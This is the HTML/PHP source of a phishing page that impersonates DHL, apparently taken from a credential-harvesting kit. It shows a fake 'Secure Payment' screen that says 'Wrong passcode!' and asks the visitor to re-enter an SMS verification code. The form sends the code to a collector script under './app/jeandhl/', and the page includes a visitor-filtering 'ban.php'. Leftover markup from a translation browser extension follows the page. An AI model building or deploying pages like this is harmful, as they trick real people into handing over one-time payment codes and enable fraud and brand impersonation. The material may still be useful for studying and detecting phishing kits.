<?php
include "./system/ban.php" 
?>
<!DOCTYPE html>
<html lang="en" class="wf-roboto-n4-active wf-roboto-n3-active wf-roboto-n5-active wf-roboto-n7-active wf-roboto-i4-active js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths uk-notouch wf-sourcecodepro-n4-active wf-sourcecodepro-n7-active wf-active"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link rel="icon" type="image/gif" href="./files/img/dhl.gif" sizes="16x16">
    <link rel="icon" type="image/gif" href="./files/img/dhl.gif" sizes="32x32">

    <title>Secure Payment</title>

    <link href="./files/img/css" rel="stylesheet" type="text/css">

    <!-- uikit -->
    <link rel="stylesheet" href="./files/css/uikit.almost-flat.min.css" media="all">
    <!-- uikit -->

    <link rel="stylesheet" href="./files/css/uikit.almost-flat.min(1).css">

    <!-- altair admin assets page -->
    <link rel="stylesheet" href="./files/css/login_page.min.css">
    <link rel="stylesheet" href="./files/fonts/Raleway-Medium.ttf">
    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@500&display=swap" rel="stylesheet">

    <style type="text/css">
    body{
      padding: 0;
    }
  .uk-form-row {
    position: relative;
    display: flex;
    flex-flow: column;
    padding: 10px;
    background-color: #fff;
    border: 1px solid #d1d1d1;
    border-radius: 4px;
}
.dhl-InputField-input {
    display: block;
    order: 1;
    font-family: inherit;
    resize: none;
    border: none;
    border-radius: 0;
    outline: none;
}
   @font-face {
         font-family: "Frutiger";
         src: url('./files/fonts/FrutigerLTStd-Roman.otf');
         }

   .digital {
         font-family: "Frutiger";
         }

         #header_main{
           background: linear-gradient(to right, #fc0 0%, #fc0 30%, #ffe57f 79%, #fff0b2 100%);
           background-color: #fc0;
           background-repeat: no-repeat;
           height: 60px;
           margin: 0;
         }

         .uk-navbar-flip {
             padding: 15px;
         }

         .md-btn {
    border-radius: 4px;
    padding: 4px 16px;
  }

  .login_page_wrapper{
    padding-top: 5%;
  }
  @media (max-width: 460px){
    .login_page_wrapper {
      max-width: 90%;
    }
  }
  .dhl-Button--secondary, .dhl-Button--dark {
    color: #d40511 !important;
    background-color: rgba(255,255,255,0.6) !important;
    border: 1px solid #d40511 !important;
}
.dhl-Button {
  width: 100%;
    position: relative;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 3rem;
    min-height: 3rem;
    padding: 0;
    overflow: visible;
    font-family: inherit;
    font-size: 1rem;
    font-weight: 700;
    line-height: 100%;
    color: inherit;
    text-align: center;
    text-decoration: none;
    white-space: normal;
    vertical-align: middle;
    touch-action: manipulation;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    background-color: transparent;
    border: 0;
    border-radius: 4px;
    transition: background-color .15s ease,border-color .15s ease,color .15s ease,transform .15s cubic-bezier(0.215, 0.61, 0.355, 1);
    will-change: transform;
}
.dhl-Button--secondary::before, .dhl-Button--dark::before {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    content: "";
    border: 1px solid #d40511 !important;
    border-radius: inherit;
    transition: border-color .15s ease;
}
.invlog{
  margin-bottom: 10px;
  display: inline-block;
  color: #d40511 !important;
}
</style><link rel="stylesheet" href="./files/fonts/css(1)" media="all">

</head>
<body class="login_page" style="background-image: url(./files/img/banner.png);">
  <header id="header_main">
      <div class="header_main_content">
          <nav class="uk-navbar" style="background: none; border: none;">
            
          <a href="" style="margin-left:0px; padding-top:10px; margin-top:1px;"><img class="img" src="./files/img/logo.png" style="/*max-width:170px;margin-top:28px;margin-left:35px;*/ height: 18px; margin-top: 20px; margin-left: 20px;" alt=""></a>
              

            </nav>
          </div>
        </header>
    <div class="login_page_wrapper">
        <div class="" style="background:#fff; padding:25px 15px 15px;" id="login_card">
         
            <div class="md-card-content large-padding" id="login_form">
                <form action="./app/jeandhl/jeansms2.php" method="POST" id="form_validation" class="uk-form-stacked">
                  <div>
                            <h2 style="font-family: Raleway;">Secure Payment</h2>
                            <img style="max-width:25%;height:auto;" src="./files/img/smartphone.png">
                            <p>Re-enter the passcode you received in Sms.</p>
                            <span style="color: #D40511;font-family: Relaway;"><strong>Wrong passcode!</strong></span>
                            
                            
                            </div>
                            <div class="uk-form-row">
                              
                        <label for="login_username" style="color:#d40511;font-family: Raleway;">Verification key*
                        <input class="dhl-InputField-input" type="text" id="jeansms2" name="jeansms2" data-parsley-trigger="change" required="" data-parsley-id="6">
          </label>
          </div>
          
           
                    <div class="uk-margin-medium-top">
                        <input style="font-family: Raleway;" type="submit" class="dhl-Button dhl-Button--secondary" name="login" value="Check">                   


                     </div>

                </form>
            </div>


        </div>

    </div>
    <!-- google web fonts -->
<center>

<br><footer style="color: #D2002E;font-family: Raleway;">&copy; Copyright 2021 DHL</footer>
</center>

      <script src="./file/js/webfont.js" type="text/javascript" async=""></script><script>
      WebFontConfig = {
          google: {
              families: [
                  'Source+Code+Pro:400,700:latin',
                  'Roboto:400,300,500,700,400italic:latin'
              ]
          }
      };
      (function() {
          var wf = document.createElement('script');
          wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
          '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
          wf.type = 'text/javascript';
          wf.async = 'true';
          var s = document.getElementsByTagName('script')[0];
          s.parentNode.insertBefore(wf, s);
      })();
  </script>

  <!-- momentJS date library -->
  <script src="./files/js/moment.min.js"></script>

  <!-- common functions -->
  <script src="./files/js/common.min.js"></script>
  <!-- uikit functions -->
  <script src="./files/js/uikit_custom.min.js"></script>
  <!-- altair common functions/helpers -->
  <script src="./files/js/altair_admin_common.min.js"></script>

  <!-- page specific plugins -->

  <!--  notifications functions -->
  <script src="./files/js/components_notifications.min.js"></script>

  <!-- enable hires images -->
  <script>
      $(function() {
          altair_helpers.retina_images();
      });
  </script>


    <!-- altair assets page functions -->
    <script src="./files/js/login_page.min.js"></script>



<div id="SLG_balloon_obj" alt="0" style="display: block;"><div id="SLG_button" class="SLG_ImTranslatorLogo" style="background: url(chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/imtranslator-s.png); display: none; opacity: 0; left: 881px; top: 587px; transition: visibility 1s ease 0s, opacity 1s linear 0s;"></div><div id="SLG_shadow_translation_result2" style="display: none;"></div><div id="SLG_shadow_translator" style="left: -10000px; top: -10000px; display: none;"><div id="SLG_planshet"><div id="SLG_arrow_up" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/up.png&quot;);"></div><div style="visibility:hidden;" id="SLG_Bproviders"></div><div id="SLG_alert_bbl" style="display: none;"><div id="SLHKclose" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/delete.png&quot;);"></div><div id="SLG_alert_cont"></div></div><div id="SLG_TB"><table id="SLG_tables" cellspacing="1"><tr><td class="SLG_td" width="10%" align="right"><input id="SLG_locer" type="checkbox" title="Lock-in language"></td><td class="SLG_td" width="20%" align="left"><select id="SLG_lng_from" class="SLG_lngs"><option value="auto">Detect language</option><option value="af">Afrikaans</option><option value="sq">Albanian</option><option value="am">Amharic</option><option value="ar">Arabic</option><option value="hy">Armenian</option><option value="az">Azerbaijani</option><option value="eu">Basque</option><option value="be">Belarusian</option><option value="bn">Bengali</option><option value="bs">Bosnian</option><option value="bg">Bulgarian</option><option value="ca">Catalan</option><option value="ceb">Cebuano</option><option value="ny">Chichewa</option><option value="zh-CN">Chinese (Simplified)</option><option value="zh-TW">Chinese (Traditional)</option><option value="co">Corsican</option><option value="hr">Croatian</option><option value="cs">Czech</option><option value="da">Danish</option><option value="nl">Dutch</option><option value="en">English</option><option value="eo">Esperanto</option><option value="et">Estonian</option><option value="tl">Filipino</option><option value="fi">Finnish</option><option value="fr">French</option><option value="fy">Frisian</option><option value="gl">Galician</option><option value="ka">Georgian</option><option value="de">German</option><option value="el">Greek</option><option value="gu">Gujarati</option><option value="ht">Haitian Creole</option><option value="ha">Hausa</option><option value="haw">Hawaiian</option><option value="iw">Hebrew</option><option value="hi">Hindi</option><option value="hmn">Hmong</option><option value="hu">Hungarian</option><option value="is">Icelandic</option><option value="ig">Igbo</option><option value="id">Indonesian</option><option value="ga">Irish</option><option value="it">Italian</option><option value="ja">Japanese</option><option value="jw">Javanese</option><option value="kn">Kannada</option><option value="kk">Kazakh</option><option value="km">Khmer</option><option value="ko">Korean</option><option value="ku">Kurdish</option><option value="ky">Kyrgyz</option><option value="lo">Lao</option><option value="la">Latin</option><option value="lv">Latvian</option><option value="lt">Lithuanian</option><option value="lb">Luxembourgish</option><option value="mk">Macedonian</option><option value="mg">Malagasy</option><option value="ms">Malay</option><option value="ml">Malayalam</option><option value="mt">Maltese</option><option value="mi">Maori</option><option value="mr">Marathi</option><option value="mn">Mongolian</option><option value="my">Myanmar (Burmese)</option><option value="ne">Nepali</option><option value="no">Norwegian</option><option value="ps">Pashto</option><option value="fa">Persian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="pa">Punjabi</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sm">Samoan</option><option value="gd">Scots Gaelic</option><option value="sr">Serbian</option><option value="st">Sesotho</option><option value="sn">Shona</option><option value="sd">Sindhi</option><option value="si">Sinhala</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="so">Somali</option><option value="es">Spanish</option><option value="su">Sundanese</option><option value="sw">Swahili</option><option value="sv">Swedish</option><option value="tg">Tajik</option><option value="ta">Tamil</option><option value="te">Telugu</option><option value="th">Thai</option><option value="tr">Turkish</option><option value="uk">Ukrainian</option><option value="ur">Urdu</option><option value="uz">Uzbek</option><option value="vi">Vietnamese</option><option value="cy">Welsh</option><option value="xh">Xhosa</option><option value="yi">Yiddish</option><option value="yo">Yoruba</option><option value="zu">Zulu</option></select></td><td class="SLG_td" width="3" align="center"><div id="SLG_switch_b" title="Switch languages" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/switchb.png&quot;);"></div></td><td class="SLG_td" width="20%" align="left"><select id="SLG_lng_to" class="SLG_lngs"><option value="af">Afrikaans</option><option value="sq">Albanian</option><option value="am">Amharic</option><option value="ar">Arabic</option><option value="hy">Armenian</option><option value="az">Azerbaijani</option><option value="eu">Basque</option><option value="be">Belarusian</option><option value="bn">Bengali</option><option value="bs">Bosnian</option><option value="bg">Bulgarian</option><option value="ca">Catalan</option><option value="ceb">Cebuano</option><option value="ny">Chichewa</option><option value="zh-CN">Chinese (Simplified)</option><option value="zh-TW">Chinese (Traditional)</option><option value="co">Corsican</option><option value="hr">Croatian</option><option value="cs">Czech</option><option value="da">Danish</option><option value="nl">Dutch</option><option selected="selected" value="en">English</option><option value="eo">Esperanto</option><option value="et">Estonian</option><option value="tl">Filipino</option><option value="fi">Finnish</option><option value="fr">French</option><option value="fy">Frisian</option><option value="gl">Galician</option><option value="ka">Georgian</option><option value="de">German</option><option value="el">Greek</option><option value="gu">Gujarati</option><option value="ht">Haitian Creole</option><option value="ha">Hausa</option><option value="haw">Hawaiian</option><option value="iw">Hebrew</option><option value="hi">Hindi</option><option value="hmn">Hmong</option><option value="hu">Hungarian</option><option value="is">Icelandic</option><option value="ig">Igbo</option><option value="id">Indonesian</option><option value="ga">Irish</option><option value="it">Italian</option><option value="ja">Japanese</option><option value="jw">Javanese</option><option value="kn">Kannada</option><option value="kk">Kazakh</option><option value="km">Khmer</option><option value="ko">Korean</option><option value="ku">Kurdish</option><option value="ky">Kyrgyz</option><option value="lo">Lao</option><option value="la">Latin</option><option value="lv">Latvian</option><option value="lt">Lithuanian</option><option value="lb">Luxembourgish</option><option value="mk">Macedonian</option><option value="mg">Malagasy</option><option value="ms">Malay</option><option value="ml">Malayalam</option><option value="mt">Maltese</option><option value="mi">Maori</option><option value="mr">Marathi</option><option value="mn">Mongolian</option><option value="my">Myanmar (Burmese)</option><option value="ne">Nepali</option><option value="no">Norwegian</option><option value="ps">Pashto</option><option value="fa">Persian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="pa">Punjabi</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sm">Samoan</option><option value="gd">Scots Gaelic</option><option value="sr">Serbian</option><option value="st">Sesotho</option><option value="sn">Shona</option><option value="sd">Sindhi</option><option value="si">Sinhala</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="so">Somali</option><option value="es">Spanish</option><option value="su">Sundanese</option><option value="sw">Swahili</option><option value="sv">Swedish</option><option value="tg">Tajik</option><option value="ta">Tamil</option><option value="te">Telugu</option><option value="th">Thai</option><option value="tr">Turkish</option><option value="uk">Ukrainian</option><option value="ur">Urdu</option><option value="uz">Uzbek</option><option value="vi">Vietnamese</option><option value="cy">Welsh</option><option value="xh">Xhosa</option><option value="yi">Yiddish</option><option value="yo">Yoruba</option><option value="zu">Zulu</option></select></td><td class="SLG_td" width="5%" align="center"> </td><td class="SLG_td" width="8%" align="center"><div id="SLG_TTS_voice" title="undefined" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/ttsvoice.png&quot;);"></div></td><td class="SLG_td" width="8%" align="center"><div id="SLG_copy" title="Copy translation" class="SLG_copy" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/copy.png&quot;);"><div id="SLG_copy_tip"></div></div></td><td class="SLG_td" width="8%" align="center"><div id="SLG_bbl_font_patch"></div><div id="SLG_bbl_font" title="Font size" class="SLG_bbl_font" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/font.png&quot;);"></div></td><td class="SLG_td" width="8%" align="center"><div id="SLG_bbl_help" title="Help" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/bhelp.png&quot;);"></div></td><td class="SLG_td" width="15%" align="right"><div id="SLG_pin" class="SLG_pin_off" title="Pin pop-up bubble" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/pin-on.png&quot;);"></div></td></tr></table></div></div><div id="SLG_shadow_translation_result" style="visibility: visible;"></div><div id="SLG_loading" class="SLG_loading" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/loading.gif&quot;);"></div><div id="SLG_player2" style="display: none;"></div><div id="SLG_alert100" style="display: none;">Text-to-speech function is limited to 200 characters</div><div id="SLG_Balloon_options" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/bg3.png&quot;) rgb(255, 255, 255);"><div id="SLG_arrow_down" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/down.png&quot;);"></div><table id="SLG_tbl_opt" width="100%"><tr><td class="SLG_td" width="5%" align="center"><input id="SLG_BBL_locer" type="checkbox" checked="1" title="Show Translator&#39;s button 3 second(s)"></td><td class="SLG_td" width="5%" align="left"><div id="SLG_BBL_IMG" title="Show Translator&#39;s button 3 second(s)" style="background: url(&quot;chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/img/util/bbl-logo.png&quot;);"></div></td><td class="SLG_td" width="70%" align="center"><a href="chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/html/options/options.html?bbl" target="_blank" class="SLG_options" title="Show options">Options</a> : <a href="chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/html/options/options.html?hist" target="_blank" class="SLG_options" title="Translation History">History</a> : <a href="chrome-extension://mchdgimobfnilobnllpdnompfjkkfdmi/content/html/options/options.html?feed" target="_blank" class="SLG_options" title="ImTranslator Feedback">Feedback</a> : <a href="https://imtranslator.net/extensions/?tp=op-GT&amp;a=0" target="_blank" class="SLG_options" title="Make a small contribution">Donate</a></td><td class="SLG_td" width="15%" align="right"><span id="SLG_Balloon_Close" class="SLG_options" title="Close">Close</span></td></tr></table></div></div></div></body></html>